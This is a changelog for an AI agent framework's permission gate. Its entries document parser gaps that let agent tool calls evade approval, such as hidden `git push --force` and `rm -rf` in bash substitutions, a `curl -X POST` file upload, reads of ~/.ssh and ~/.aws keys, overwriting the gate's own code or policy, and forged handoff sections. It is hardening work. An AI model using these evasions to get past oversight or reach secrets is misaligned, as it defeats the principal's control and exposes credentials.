- Permissions bypass keeps its floor for a camelCase tool again, and the registry's high-risk ask reaches one
  (review 5662071801 of #602). #515 (#602) reads a camelCase tool name by its hump words, so the call leads with
  that category and its store write, secret read or `unknown` is in its unsplit `floor` reading. Two exo-gate hook
  checks past the decision read only the lead category. #659 (#651) since made a replace of a store file lead with
  `store_write` (`mcp__fs__searchReplace`, `findAndReplace` on `~/.exo/seats/principal.toml`), but on main
  e0968a2b bypass still ran `readFile` and `getOrCreateFile` on `~/.exo/policies/gates.yaml`, `readFile` on the
  seat file, `mcp__fs__readFile` on `~/.exo/config.json`, `mergeGithub` and `mcp__github__mergePullRequest`
  naming `~/.ssh/id_rsa` and `mcp__slack__postMessage` naming `~/.aws/credentials`, and a tool the registry calls
  high risk ran in every mode (`mcp__fs__writeFile`, `mcp__fs__uploadFile`, `mcp__fs__searchReplace` on a plain
  path, `mcp__gh__listIssues`). Bypass now keeps the floor when any reading or part is `store_write` or
  `credentials` (`gate.no_grant`), and the high-risk ask fires when any reading is `unknown`. A post held for its
  posting fixes stays held. Snake names and camelCase calls with no floor reading decide as before. Hook probe
  against main e0968a2b: 1360 lines, 164 changed, 0 lowered. Tests: `plugins/exo-gate/tests/test_camel_floor_hook.py`.
  **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-065, D-038), `docs/DEVELOPER-GUIDE.md` §3.
- A correction to the #703 entry above (review 5675164403 of #703): not every snake name decides as before. A snake
  shell call whose own folder argument is a secret folder (#311) now asks once in bypass too. Its line keeps its own
  category (`read` for `cat` and `ls`), and the store read is a `credentials` part, which the floor now reads. So
  `terminal`, `bash` and `exec_command` running `cat config` with `workdir` `~/.kube`, and `bash` running `ls` with
  `cwd` `~/.exo/keys`, `~/.aws` or `~/.claude`, ran in bypass on main 58503282 and ask once since #703. This is
  what D-065 asks for: secrets still ask. `cat ~/.kube/config` asked on both. A shell call in an ordinary folder
  decides as before. No code change. Tests: `plugins/exo-gate/tests/test_camel_floor_hook.py`. **Docs:**
  `docs/GATE.md`, `DECISIONS.md` (D-065), `docs/DOCS-MAP.md`.
- `/tab` tells the user when the new window loses a permission flag (#669). The flag is dropped from the
  new command, but the new window keeps `--seat` and `EXO_HOME`, so it joins this core (D-028, D-039) and
  the core's permission mode still applies there, bypass included: the warning says that rather than
  claiming the window asks for each action, which reviewers showed it does not. `restart.dropped_permission_flags`
  reads the same command source `new_command` starts from (`EXO_RESTART_CMD`, else the current
  arguments), follows argparse's abbreviated long flags, and the client posts one warning naming the
  flags it dropped and where the core's mode stands. Warning only: the flags are still dropped, which
  stays the safe default.
- Ruff F541 fixed in the dollar-paren gate tests (#662): two f-strings in
  tests/security/test_gate_dollar_paren_cmdsub.py carried no interpolated values. Dropping the unused
  `f` prefix preserves the test cases and removes the two findings.

- Web approval cards show the keyboard sequence for their available answers and the current confirmation or deny-note
  step. Ctrl+F focuses the first approval without losing the composer draft, and the focused card has an accent outline.

- The web composer's command list names `/tab` again (#661): the command joined the terminal client in #621
  but never entered the completion table the web route reads its client commands from.
- Context: `_carry_pins` reads the parent's pins fresh from disk, so a pin the parent undid does not resurrect in a child bound from it (#645).
- A `$((` bash reads as a command substitution is read as one now (#553). bash closes the `$( ` at the first `)`
  outside quotes, backquotes, `$( )` bodies and comments, and reads the span as arithmetic only when the text
  between the parens, quoted spans skipped, holds balanced parens (chk_arithsub); else it re-reads the span as
  `$( ( )`, a subshell, and the commands in it run. The gate matched `$((` against `))` without counting quotes,
  so a `((` in a quoted word made it read the whole span as arithmetic and it never read the commands:
  `echo $((echo '((' ; git push --force origin main) )` was an allowed `read` under `deny: [force_push]`, where
  the same line written `echo $( (echo '((' ; git push --force origin main) )` denied, and so were
  `echo $((echo "(( " ; ... ) )` and the `$'..'` form, a hidden `git push origin :main` or `rm -rf x` in the same
  shape, and `echo $(( 1 + '(' )); git push --force origin main`, where a quoted paren made the span run to the
  end of the line. The span is found with quotes and nesting counted and bash's paren balance applied, and a
  span that fails it is read as the `$( ( )` it runs as, so the commands in it classify; the arithmetic span is
  the one bash extracts, so what follows is read where bash discards its line only after the error. An unclosed
  `$((` bash cannot parse and runs nothing, and the span stays arithmetic text to the end of the line, as
  before, so the deep-nest readings stay linear. Plain arithmetic decides as it did
  (`$((1+2))`, `$((PATH=5))`, `$[PATH=5]`, a ternary, a `$( )` or a backquote inside the body), and `_nest_end`
  ends a cut at the same span. Tests: `tests/security/test_gate_dollar_paren_cmdsub.py`. **Docs:** `docs/GATE.md`,
- A read-named tool that replaces text writes the store file it names (#651). `search_replace` and
  `find_and_replace` read as reads, so the store scan skipped them (#494) and
  `mcp__fs__search_replace {"path": "~/.exo/seats/principal.toml", "search": "ask", "replace": "bypass"}` ran
  with no ask in every permission mode -- the seat file's default could be made bypass, and the policy files and
  config.json were as bare. The name's replace, substitute, patch, edit, update and sed words count as
  fetch-write words now, and so do arguments that carry the old text and the new beside the path they name, so
  the replace of a store file is a `store_write` the principal alone answers, as `write_file` is (the store
  floor, observe's `no_grant` and bypass's floor all hold); a plain read of the store stays a read.
  Differential against main fa5dfcd8: 0 lowered. Tests: `tests/security/test_gate_file_tool_replace_writes.py`,
  `plugins/exo-gate/tests/test_hook.py`, `plugins/exo-gate/tests/test_bypass.py`. **Docs:** `docs/GATE.md`,
  `DECISIONS.md` (D-038).
- Command web tests now include the `permissions` module fixture in their offline Node module sets, so the `chat.js` and `app.js` imports resolve (#617).
- Shared agent-log search and recall left out only a private thread's own rows, so an ordinary thread under one
  still matched (#632). The agent branch of `SessionStore.search` now excludes a private thread and its
  descendants at any depth inside the one query (a recursive `hid` set, as `store.private` and
  `memory_zoom(subagent=)` already walked), so a private hit cannot eat the result limit, a parent loop ends,
  and public threads, hidden-row filtering and the thread's own local search are unchanged.
  Tests: `tests/core/test_agent_log.py::test_shared_search_leaves_out_a_private_threads_descendants`.
- A `target:` entry matches every store a credentials line names, and a file below a globbed secret folder asks
  (#609 follow-up, review 5662072421). A credentials line takes the first store it names as its target, and since
  #609 a secret-folder glob counts as one, so it came first and a `target:` deny, `reserved:` entry or rule on a
  later store stopped matching: `cat ~/.ss?/* ~/.aws/credentials` under `deny: ["target:*/.aws/*"]` and
  `cat ~/.aw?/* ~/.ssh/id_rsa` under `deny: ["target:*/.ssh/*"]` went deny -> ask. Each other store the line names
  is now a `credentials` part with that store as its target, beside the line's own, so these are denied again, and
  so are the literal forms that asked before #609 too (`cat ~/.aws/* ~/.ssh/id_rsa`, `cat ~/.aws/credentials;
  cat ~/.ssh/id_rsa`) and a store after a Keychain read or an environment dump (`env; cat ~/.ssh/id_rsa`). A glob
  folder that goes below a secret folder asks too: `cat ~/.gnup?/private-keys-v1.d/*`, `cat ~/.aw?/sso/cache/*`,
  `cat ~/.ss?/keys/*`, `cat ~/.exo/key?/old/*`, `cat ~/.gnup?/*/*` and `read_file ~/.gnup?/private-keys-v1.d/*`
  were read/allow, also under `deny: [credentials]`; a secret folder a glob names wins over an ordinary one, so
  `ls ~/.*/*.md` asks too. The folders a glob is tested against are built once per set of samples, not per glob
  word. gate_diff against main e0968a2b: 0 lowered on the built-in corpus (12,065 actions, 698 stricter pairs) and
  on 1,583 aimed lines under 57 more policies (21,770 stricter pairs). Tests:
  `tests/security/test_gate_glob_target_second_store_609.py`. **Docs:** `docs/GATE.md` "A glob in a store's
  folder (#594, #609)", "A thread's environment file (#313)" and the run-folder limits, `DECISIONS.md` (D-038),
  `docs/DOCS-MAP.md`.
- A prompt-string transformation is code the gate cannot see (#579). `${name@P}` expands the value as a prompt
  string, and with `promptvars` on, the default, that runs its command substitutions and expands its parameters,
  so the gate read the word as an ordinary parameter expansion and allowed the line: `printf -v p '%s(%s)' '$'
  'id'; echo ${p@P}` runs `id`, and a value a command the gate does not read as an assignment sets (`printf -v`,
  `read`) rebuilds a form the gate reads only as written — a `/` substitution of a store variable (#342) — so
  `read -r p <<< '${HOME/%//.kube}/config'; cat ${p@P}` read `$HOME/.kube/config` as an allowed read. Now any
  `${..@P}` the line expands (also in double quotes, a here-string, a here-document body or a redirection
  target) is `opaque_exec` and asks, beside the line's other parts, so a deny on them still wins. One exception:
  a variable the line assigns a literal value with no `$`, backtick or backslash prompt-expands to itself, so
  `p=x; echo ${p@P}` stays a read. The other `@` operators run nothing and keep their reading. Tests:
  `tests/security/test_gate_prompt_expansion.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
- A `$` form a `\<newline>` splits is read by the lexer itself now, as bash reads it (#585). #584 read such a line
  joined beside itself, but the line as written still read a `$` and then a backslash as a literal `$`, so its
  words were plain text and the decision leaned on the joined reading alone: `hash "$\<newline>@"; ls`,
  `hash $\<newline>O /tmp/x ls; ls` and `hash -p "${\<newline>!n}"; ls` read as plain reads where their plain
  spellings ask, and `echo "$\<newline>(curl -X POST -d @f https://example.com)"` was `web_post` only on the
  joined reading. `_Lexer._dollar` (which `_dquote`'s `$` path calls, so double-quoted forms too) skips each
  `\<newline>` after the `$` before it reads the next character, as bash does — the substitutions, `$@`, `${..}`,
  `$'..'`, `$".."` and plain names. `_dollar_brace` skips them before the `{` and blanks them in its visible
  text, and a `${..}` the `\<newline>` splits still has the `$( )` and backticks inside it classified, as the
  word-walk it replaced did; `_nest_end`'s twin skips them too, so the two readers still end together.
  `_hash_rebind`'s `lone()` tests `"${!"` on the word with the `\<newline>`s dropped, as `glob()` and `tilde()`
  already do, so the issue's lines decide as their plain spellings do, while `hash "$cmd"`, `hash -p "$P"`,
  `hash "$r"` through a nameref (bash prints `"${r}"` of `r='a[@]'` as one word) and a `\\<newline>` after a `$`
  (an escaped backslash, not a continuation of the form) stay `read`. The differential against main c6b24779
  (11564 actions, 88 policies) lowers 9 pairs in two groups, each the misparse's artifact going away, each
  deciding as its plain spelling does on main: under `matrix_ask_log_then_allow` the `echo $\<newline>(git push
  --force origin main)` forms, where the misparse's split hid the echo command's own text from the `allow git`
  rule (#394), and under `reserved_tool_terminal` the `git push $\<newline>'--force' origin main` forms, whose
  ask stands and whose dropped reserved hit was the misparse's phantom `$--force` target. Both groups are named
  in the D-038 amendment. Tests: `tests/security/test_gate_dollar_line_continuation.py`. **Docs:** `docs/GATE.md`,
  `DECISIONS.md` (D-038).
- A venv or Hermes home the home's config.json records alone is protected (#612). `_code_paths` (#459) read the
  venv and Hermes' plugin home from the environment only (`EXO_VENV`, `EXO_HERMES_HOME`, else the home's own
  spellings), but a supported custom install records them in the file alone: `scripts/install.sh` takes the venv
  from `EXO_VENV` at install time and writes that path back into config.json (`venv`, and `hermes_home` beside
  it), and nothing exports the variables when the daemon runs, so with `{"venv": "<tmp>/customvenv"}` in
  config.json and no `EXO_VENV`, a `write_file` into `<tmp>/customvenv/lib/evil.py` classified `local_write` and
  was allowed under the default policy, while `Config.load` resolved that same folder as the venv. The gate now
  reads the recorded `venv` and `hermes_home` too, as `_store_roots` reads the config's `principals` through
  `store.explicit_roots`: a missing or unreadable file, or a value that is not an absolute path once ~ is
  expanded, adds nothing, and the environment still takes precedence, as `Config.get` resolves it — a folder the
  file records joins the protected list beside what the environment names, it never replaces one. So the
  default-spelling rows and a config with no such keys decide as main does, and only new folders ask: a
  config-only venv or Hermes plugin home asks as `store_write` on the floor, a `cd` into it counts, a delete or
  move of it counts, reads stay reads. The differential against main d4cc7ea3 found nothing lowered. Tests:
  `tests/security/test_gate_code_writes.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
- A pending undo of a host's `/undo N` waits for the session's next turn under its session, not in the engine that
  heard the notice (#580). Hermes's `/undo N` takes N turns with one notice: exo-context dropped the last turn's
  pins at once and the earlier turns' on the session's next turn, in the engine that heard the notice, so a new
  agent Hermes built before that turn (a `/reasoning`, `/fast` or `/personality` rebuild) never read the pending
  undo and the earlier turns' pins stayed, with the per-turn block putting the undone ruling back. The engine that
  hears the notice now records it with `exo.host_undo.pend(session, window)`, beside the window the notice left,
  and the engine that runs the session's next turn takes it from there with `exo.host_undo.take(session)` and
  drops the pins the window showed that the transcript no longer holds, whichever agent that engine belongs to. A
  second notice before that turn keeps the first record's window, a compression move carries the record into the
  child session, and a compaction that folds the window's first row ties its block to the record while it waits,
  in whichever engine compacts. The record never outlives the session's next turn, which settles it whatever it
  finds, a transcript cut short included, and it can drop only the pins its own window showed, so a stale record
  never drops a pin taken after it. An `/undo` in the no-agent gap still reaches no provider: the CLI would have
  to report `exo.host_undo.report(session)` itself, one call, which reaches the engines still registered for the
  session and lets the rebuilt agent's turn finish the undo. With no engine registered any more, nothing holds the
  window, and that part waits on the CLI change. Tests: `plugins/exo-context/tests/test_context_provenance.py`
  (a rebuilt agent's turn, the gap report, the pins taken while the record waited, a rebind while it pends),
  `tests/test_host_undo.py`. **Docs:** `docs/MEMORY-MODEL.md`, `docs/DEVELOPER-GUIDE.md`, `docs/HANDOFF.md`,
  `docs/DOCS-MAP.md`, `DECISIONS.md` (D-041).
- A leading assignment quoted whole in an `env -S` text no longer hides the command after it (#591). GNU env splits
  the `-S` text into words and reads them as its own argv, so a word quoted whole with the form `NAME=value` is an
  assignment there — `env -S "'X=a b' printenv X"` prints `a b` — but the gate read the text as one shell line
  (`classify_shell` of the split), whose first word was an unknown program, so the command behind it was never
  read: `env -S "'X=a b' rm -rf /srv/data"`, `sudo env -S "'X=a b' rm -rf /srv/data"` and
  `env -S '"X=a b" rm -rf /srv/data'` were `opaque_exec` and asked under `deny: [delete]`, where the spelling
  without `-S` is `delete` and denies, and under `categories: {opaque_exec: allow}` the first was allowed, so a
  policy that denies the hidden command or allows the shell around it failed open. The gate now reads the leading
  words of the split text as env's own argv, as env's own arguments already are: the first word that is neither an
  env option (`-i`, `--null`, `-u NAME`, `--chdir DIR`...) nor an assignment starts the command, for `-S`,
  `--split-string` and behind `sudo` and `doas`, and the text from that word on is classified beside the shell
  line's reading, so the hidden command's category reaches the decision the way the spelling without `-S` does
  (`git push origin feature && env -S "'X=a b' git push --force origin main"` now asks under the allow line, not
  logs). This reading took a quoted `NAME=value` word after `--` for the command (env still reads it as an
  assignment; the follow-up above reads it so), left a word with a shell operator in it to the line's own
  reading, and does not follow a split inside the split; an unknown program first is still the command and its
  arguments run nothing. The differential against main 3bf26afc (11438 actions, 88 policies) found nothing
  lowered; it held no ssh-wrapped `-S` line, and behind a hop this reading did lower (the follow-up above). Tests:
  `tests/security/test_gate_category_deny_parts.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
- A policy pattern that does not compile is refused when the policy loads (#466). `normalize_policies` checked
  types and outcome names but compiled nothing, so a rule's `match.command`, a `command:` entry or a mapping's
  `command` in `deny:` and `reserved:`, and a `posting.forbid` pattern with a typo raised `re.PatternError` only
  when `decide` reached it. The exo-gate hook caught that: with no required executor a read tool ran with no ask,
  observe mode ran the call, and enforce mode showed a fallback card with no approver list offering "always", so
  one typo in a deny entry a principal added to tighten the gate could let a seat answer every later call the
  gate failed on. The loader now compiles each of those patterns and raises `PolicyError` naming the entry, and
  `load_policies` names the file before it (`policies/gates.yaml: gates.deny[0].command: bad pattern '^(rm|shred':
  missing ), unterminated subpattern at position 1`), so the hook's fallback runs on the defaults, which ask on
  anything irreversible or public, with the message in every decision's reason and in `/gate`; a store write, a
  secret and a force push still ask the principal alone, once, in every mode, on a real rule key. A policy whose
  patterns compile decides identically; only the broken one changes. Tests: `tests/security/
  test_gate_policy_patterns.py`, `plugins/exo-gate/tests/test_hook.py`, `plugins/exo-gate/tests/test_tool_cwd.py`.
  **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
- A decision number `docs/FIX-SWEEP.md` lists as free can no longer already be one `DECISIONS.md` uses
  (#600). The sweep's list read D-078 and D-082 as free while PR #235 itself added the D-082 entry, and the
  docs tests passed on that head; an earlier collision with D-081 from #214 was caught only by hand.
  `tests/docs/test_docs_fix_sweep.py` reads the list the way the file words it ("D-078 and D-082 are free")
  and the `## D-` headings DECISIONS.md keeps, and fails naming the collision, so a stale list or a taken
  number cannot slip past review.
- Permissions bypass lowered asks in turns the principal did not start (#598). The gate read the mode by session
  alone, and no hook could tell who started a turn: the loop metadata carries the author (D-040) but stopped at
  the user message. Now the loop passes the turn author into every `ToolContext` and tool hook kwarg (`author`,
  beside `turn_id`), and the gate lowers an ask only when that author is the principal, so a turn a local caller,
  a peer, a bus wake or a job notice started in the same core asks as if bypass were off. A non-principal steer
  stops the lowering for the rest of the turn. The bypass ledger row names the turn author, and hooks that do not
  take the new kwarg are unchanged.
- bash's legacy arithmetic `$[..]` is read as the `$((..))` it stands for (#588). bash still accepts the legacy
  form, and it evaluates as `$((..))` does, assignments included, but the lexer read `$[..]` as plain text, so an
  assignment in it went unseen where the same line written with `$((..))` asked (#341/#409): `echo $[PATH=5]; ls`
  and `echo "$[PATH=5]"; ls` were allowed `read`s, and so were `echo $[BASH_ENV=5]; ls`, `echo $[a[PATH=5]]; ls`
  (a subscript is arithmetic, and it assigns) and the #584 join `$\<newline>[PATH=5]`. The lexer now reads `$[..]`
  as the `$((..))` it stands for, with the word keeping `$[..]` as written, and an element the body sets is read
  too (`echo $[BASH_CMDS[ls]=1]; ls` rebinds a program name, as `hash -p` does) — also through `$((..))`, where
  main allowed it — and `${x:-$[PATH=5]}` reads the body through the expansion word it is in. A `$[..]` in a
  write's target keeps main's `local_write` of the path as written beside the dynamic reading, so a deny on the
  write still reaches the line, and `echo $[1+2]` stays a read.
- An older handoff file's raw lines no longer stand a forged section in the resumed system message (#540). After
  #395 the header reached the model on one line and `load_handoff` read no forged ruling, but `resume_text` still
  carried the rest of the file as written: the path line and the `{path}` launch line of main's writer before #395
  (a handoff folder name that spans lines in the operator's config), a title from before #353, a list field from
  before #353 and a summary from before #349 could put a forged `## Decisions made (principal's words, verbatim)`
  section in the system message beside the principal's real one, and a pre-#353 title could put a forged
  `## Open decisions` section first, which `load_handoff` read. `resume_text` now demotes every `## ` heading line
  `load_handoff` does not read as the section, so the reader's copies stand and the forged ones reach the model as
  `### ` data, quoted words included. `load_handoff` reads no section out of a title that does not say what the
  header's recovered topic says: the title must be the topic value's footprint, line for line. A pre-#353 file whose
  title carried a forged Decisions copy therefore reads the principal's ruling again where it read as undecided, and
  a forged Open decisions first loads none; a title edited by hand demotes nothing. The demotion takes the heading
  spellings a markdown reader takes: up to three leading spaces, and after the `##` a space, a tab or the line's
  end, while a fourth leading space stays an indented code block and the line stands as written. A header value's
  `-->` is now
  written `--\>`, so a markdown viewer's comment keeps the header whole, and the reader undoes the escape, where an
  older file's raw `-->` in a value reads as itself. Not covered: a forged `## Open decisions` first through an older
  file's path or launch line still reads as on main, for the reader has no value to check a path line against.
- A store or secret name matches in any case (#601, D-087). On a case-insensitive file system (default APFS)
  `.exO/config.json` IS `.exo/config.json`, but every store and secret name check read the spelling as written, so
  a case variant walked past: `cp /tmp/x ~/.exO/config.json` and `cp /tmp/x $HOME/.EXO/config.json` were
  `shell`/allow where the plain spelling is a `store_write` ask, `echo x > ~/.KUBE/config` a `local_write`/allow
  where `~/.kube/config` is `credentials`, and `cat ~/.SSH/config` a read where `~/.ssh/config` asks
  (`cat ~/.SSH/id_rsa` asked already, by the `id_rsa` name). The name checks now fold case: `~/.EXO/keys/seat`,
  `~/.exo/POLICIES/gates.yaml`, `tar -C ~/.EXO keys`, `cd ~/.EXO && ls principals` and `ls ~/.EXO/*` ask wherever
  the file system would land them on the store file. On a case-sensitive file system that also asks for a
  distinct `.exO` folder, the fail-closed side as for a glob that could name one. In a glob a part with no
  wildcard folds (a folder the file system opens: `~/.EXO/*`, `~/*/RUN/x`), and a part that holds a wildcard
  stays as written, as bash matches it against the entries (`[HOME=x]*`, `~/.e*O/*` stay ordinary).
  `EXO_GATE_CASE_SENSITIVE=1` reads main d800f33c's case-sensitive names. An ssh hop whose remote command names a
  case-variant store path keeps the host beside the line's own action in its reserved parts (`ssh host
  'rm -rf ~/.EXO/policies'` lists `(delete, host)` beside `(delete, ~/.EXO/policies)`, as main did), and the
  plain-spelling rows keep every part they had.
- Every store path a write names is a target, not only the first (#514). A store write with no secret on the call
  took its target from the first store path the scan met and made no part of the others, so a `target:` deny or
  `reserved:` entry on a later path missed and an approver could have waved the write through:
  `cp ~/.exo/policies/a.yaml ~/.exo/policies/gates.yaml`, `copy_file` and `move_file` from `a.yaml` to
  `gates.yaml` and `delete_file` on both paths asked under `deny: ["target:*/gates.yaml"]`. The store scan now
  keeps each store path a shell line or file tool writes, in the order it meets them, and each is a `store_write`
  part with that path as its target, as beside a secret (#447), so the entry matches whichever path it names. The
  first path still leads the line, `rm` of both paths was denied already (its `delete` part names the last path),
  reads keep their class, and the first path alone decides as before.
- A later command that repeats a braced store path keeps its own store write part (#611 follow-up, review
  5662072103). The store check marked each brace spelling checked for the whole line, and once #514 scanned every
  word, the first command marked each spelling it met, so a later command writing the same spelling got no part
  and its write carried the first command's text: under `categories: {store_write: deny}` and an allow rule on
  `^cp `, `cp ~/.exo/policies/a.yaml ~/.exo/policies/{g,h}.yaml; printf x > ~/.exo/policies/{g,h}.yaml` was
  denied before #514 and asked after it, and so did a matrix deny, a `log` or `ask` rule, and `tee`, `sudo tee`,
  `truncate` or `scp`. With `cp /var/tmp/a` first, the line asked before #514 too. Each check's hits on a spelling
  are kept with it now, and each command that repeats the spelling gets them for its own part, so the braced line
  decides as the unbraced one, and so does a case variant the store reads since #635 (`~/.EXO/policies/{g,h}.yaml`).
  `apply_patch` and `write_file` that write two store files make the second a
  `store_write` part too, as `copy_file` does, so a `{category: store_write, target}` deny or reserved entry on it
  matches. Tests: `plugins/exo-gate/tests/test_store_floor_any_part.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md`
  (D-038).
- A shell call's own folder read is no longer lifted by an allow rule that names only the line's text (#516). The
  `credentials` part the folder argument adds (`cwd`, or `workdir` for Hermes' terminal and Codex's exec_command)
  had no own text, so a line of one command beside it was one text for the #394 own-text test and a rule keyed on
  `command` decided the line as before, over the part's matrix cell: `git push --force origin main` with `~/.ssh`
  or `~/.exo/keys` as `cwd` asked under `matrix: {irreversible: {private: deny}}` and an allow rule on `git push`,
  where its `cd` form was denied, since the rule does not name the `cd`. The part keeps no own text, as a `cd`
  form's parts have, and now carries a `cd <folder>` stand-in among its setters, the folder as the call spells it
  and the `cd` said once (the relative read's first spelled `cd cd <folder>`), so the line is not one text and a
  rule that names only the line is passed over, as for any part it does not name.
  A rule that names everything lifts nothing, as before, the weight a heavier command adds beside the part (#468)
  is never lifted by a command rule, and a line of two commands, a policy with no rule and no matrix deny decide as
  before. Nothing is lowered.
- A glob in a secret store's folder asks (#594). `cat ~/.ss?/*`, `cat ~/.aw?/*` and `cat ~/.exo/key?/*` read as ordinary reads because `_glob_word` gave up whenever the folder part held a glob; the globbed folder is now tested against each sample's folder, with the same three-literal discipline the file side keeps and bash's rule that only a literal dot matches a leading dot, so `cat ~/*/*` stays a read.
- An ssh or mosh hop keeps its host among the line's other targets when the remote command names a target of its
  own (#493). The hop gave the host as the line's target only when the remote command's dominant part had none, so
  `ssh prod 'echo hi > /etc/hosts'` was a `local_write` of `/etc/hosts` alone: a `target: prod` rule allowed it,
  `scopes: {private: [/etc/*]}` read a path on another host as the principal's own, and a standing grant for a
  local write to `/etc/hosts` covered the same write on any host. A deny or `reserved:` entry on the host still
  reached the hop's part (D-075). Now the host and the destination stay among the other targets (#399) whenever
  the line's target is not one of them, so the line is decided on the host too and the strictest stands: the rule
  reaches the line as a deny reaches the hop's part, a scope on a local path stops at the host's reading, which
  keeps the exposure the hop gives the line, and the other targets bind the call to the exact command, so no grant
  for a local write runs the hop. The written path stays the line's target, so a rule on it still matches as
  before, and a rule on the bare host reaches a `user@host` destination too.
- An ssh or mosh hop keeps its host on a gh download or clone into the store (#461 follow-up). After #461 the
  store write leads the remote line and the gh read is a part below it, and the hop gave the host only to the
  line's own parts, so the read lost the host its empty other target took when it led:
  `ssh host gh release download v1 -R pub/x -O ~/.exo/policies/gates.yaml` asked under a deny or rule on
  `{category: read, target: host}` where it was denied before, and so did `gh repo clone` and `gh run download`
  into the store, `sudo` and `mosh` forms; the `eval` and stdin forms (`echo '..' | ssh host`) asked under a deny
  on `{category: opaque_exec, target: host}`, and a `reserved:` entry on the host's read or on `tool:terminal`
  lost its hit. Each part nested below the hop with an empty target now has a copy on the host, and the host
  joins its empty other targets; every part keeps its own reading. The parts that led over the gh read and took
  the host keep a copy on it too: mosh's local helpers (`mosh --ssh=.. host -- gh release download ..`,
  `--client`, `--local --server`) under `{category: opaque_exec, target: host}`, and the part that runs ssh's
  stdin (`echo x | ssh $H gh release download ..`), whose `(opaque_exec, $H)` hit a `reserved: [tool:terminal]`
  entry had lost. `ssh -o RemoteCommand='gh release download ..'` raised only the line's lead to internal, so
  the read below the store write stayed private and a matrix that denies an internal action asked: every part
  of the remote line is internal now, as for the hop's own command (D-075), and a nested part keeps its private
  reading as a copy beside it, so a rule on `{category: read, exposure: private}` still denies. The same holds
  where main's later readings make the store write below the hop: a store path in another letter case (#635,
  `ssh host gh release download v1 -R pub/x -O ~/.EXO/policies/gates.yaml`), a `$((` read as a command
  substitution (#652) and an `env -S` text (#634). So each of these lines decides as before #461 or stricter
  under each of these policies: on main at e0968a2b gate_diff's aimed corpus counted 499 pairs on 81 actions
  lowered against dcab371a (main before #461), and 0 with this change.
- A gh download or clone into the Exo store is a store write, as `curl -o` and `git clone` already are (#461).
  gh release download writes what it fetches into `-O`/`--output` or `-D`/`--dir`, gh run download into
  `-D`/`--dir`, gh attestation download into the current folder, and gh repo clone and gh gist clone into their
  directory word, but they read as reads on GitHub, so the gate's store check took the line for a read and never
  looked at the paths: `gh release download -O ~/.exo/policies/gates.yaml --clobber` overwrote the gate policy
  itself, and `-O ~/.exo/update/allowed_signers` replaced the signed-update trust pin (#133), where `curl -o` and
  `git clone` on the same paths ask. The store check now reads their output paths in every spelling (`-O`,
  `--output=`, `-D`, `--dir`, the clone's directory operand, with `--` before it) and a `cd` into the store
  before gh attestation download, wherever the line stands: under `sudo`, in a `$( )`, and past a `-R` before
  the subcommand (#399). In `bash -c` the line already asked, as opaque code. The line keeps the gh read as a
  part (D-075), so a deny, reserved entry, rule or matrix cell on it still applies, also on the host of an ssh
  or mosh hop (with the follow-up above), and the decision is the principal-only floor. `-O -` prints to stdout
  and stays a read, and so does a path outside the store.
- Gate (#587 follow-up, D-074): a `config.json` name an expansion hides keeps main's reading again. The merge of
  #320 into #587 let #320's store glob count the home's `config.json` without marking the call, so the line kept no
  reading as before D-074, or that reading counted the file too. Under `matrix_deny_cells`,
  `ssh -o RemoteCommand='rm -rf /srv/data; cp /tmp/x ~/.exo/con$(:)fig.json' h` asked where main before #587
  denied it, and so did a delete beside such a name under `delete: deny` with a rule allowing `^rm`, and an
  `echo x >` to it over ssh under an entry on `opaque_exec` at `internal` exposure. The glob now counts the file
  only while it counts, so the call is also read as before D-074. Such a name still asks as a store write.
- A file tool's store path is read under every key it names a path by, and a move or rename of a folder that holds
  the store is a store write with no secret beside it, as `mv` is (#494). `move_file ~/.exo -> /tmp/x` was a
  `local_write` that ran with no ask where the shell spelling asked, `mcp__filesystem__move_file` with the same
  args only logged, and a store path under `to`, `target`, `new_path`, `old_path`, `from` or `dst` was missed, so
  `rename_file {"path": "~/.ssh/id_rsa", "new_path": "~/.exo/policies/gates.yaml"}` got no store write part beside
  the secret and a seat delegated `credentials` could answer it. The scan now reads those keys, a tool whose name
  says move, rename or delete passes `ancestors=` as `mv` and `rm` do (a camelCase name split, so `deleteFile` on
  `~/.exo` asks), and a read-verb tool that writes what it took where its path arguments say (`download_file`,
  `export_report`) runs the store scan, so a download into the policy files asks. A relative destination is read
  from the session's folder the core passes, as a secret name is: `move_file` to `policies/default.yaml` from a
  session folder in `~/.exo` asks. A plain read of the store stays a read, and a copy of the store keeps its
  reading, as `cp -r` does. The resolution is the file tools' own; a shell line's store writes are still read from
  its own words. D-074's config file is reached under the new keys and from the session folder as under `path`.
  The gate differential against main finds nothing lowered.
- A write into a folder Exo loads code from is a store write, as a write into `$EXO_HOME/plugins` has been since
  #435 (#459). The gate itself, the plugins the core loads and the exo-gate plugin live in four others: the venv
  (its site-packages holds the `exo` package, so a changed `gate.py` decides every later call and a `.pth` there
  runs on each start; `${EXO_VENV:-$EXO_HOME/venv}`), Hermes' plugin home (loaded with `--with-hermes`;
  `${EXO_HERMES_HOME:-$EXO_HOME/hermes-home}/plugins`), the source copy the installer clones a git URL into and
  `exo update` and `exo web` read plugins from (`$EXO_HOME/src`), and every folder `$EXO_PLUGIN_DIRS` names
  (`default_dirs` searches them first and keeps the first plugin found of a name, so a plugin named `exo-gate`
  there takes the real one's place). Each is read as the environment the gate sees spells it, as EXO_HOME is, and
  `.exo/venv`, `.exo/src` and `.exo/hermes-home/plugins` match anywhere by name, as `.exo/plugins` does. So `cp
  evil.py ~/.exo/venv/lib/python3.13/site-packages/exo/gate.py`, a `write_file` there, `pip install --target` into
  any of the folders, `tar -C ~/.exo/src`, `git clone` into the venv and a `.pth` beside the `exo` package now ask
  the principal, where the same line was an allowed `shell` or `local_write`. A `cd` into one counts like a `cd`
  into the store, and a delete or move of a code folder (or of the home that holds one) counts as a delete of it.
  Reads stay reads. A relative `EXO_VENV` or dir, a `.venv` under the home and Hermes' own state are not code and
  keep their class. The cost: a `pip install` into the venv Exo itself runs from now asks; everyday work installs
  into a project or scratch venv instead, so the ask is rare. The D-038 amendment of 2026-10-26 records it.
- A patch header with no path (`*** Move to:`, `*** Add File:`, `*** Move File: a ->`) no longer hides the header
  after it (#548 follow-up). The reader let a header's path run onto the next line, so the next header was taken as
  that path and its write was never read. A patch tool skips the bare line and applies the next header, so after
  #548 a bare `*** Move to:` let `*** Add File: .ssh/config` through with no ask. Each header's path is now also
